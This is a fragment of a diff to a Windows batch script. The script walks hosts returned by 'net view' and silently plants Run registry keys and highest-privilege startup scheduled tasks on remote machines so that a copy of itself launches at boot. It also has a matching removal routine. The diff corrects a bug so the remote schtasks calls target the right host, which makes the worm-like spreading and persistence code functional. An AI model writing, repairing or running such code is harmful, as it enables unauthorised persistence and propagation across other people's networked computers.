@@ -191,7 +191,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The"
           reg add %%h\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
           reg add %%h\HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
           reg add %%h\HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
-          for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%i" /tr "%%i:\%%j\%~nx0" /f /rl highest
+          for /f "delims=\" %%z in ("%%h") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%i" /tr "%%i:\%%j\%~nx0" /f /rl highest
         )>nul 2>nul
       )
   
@@ -286,7 +286,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The"
           reg delete %%h\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
           reg delete %%h\HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
           reg delete %%h\HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-          for /f "delims=\" %%z in ("%%i") do schtasks /delete /s %%z /tn "%app_name% %%i" /f
+          for /f "delims=\" %%z in ("%%h") do schtasks /delete /s %%z /tn "%app_name% %%i" /f
         )>nul 2>nul
       )
 
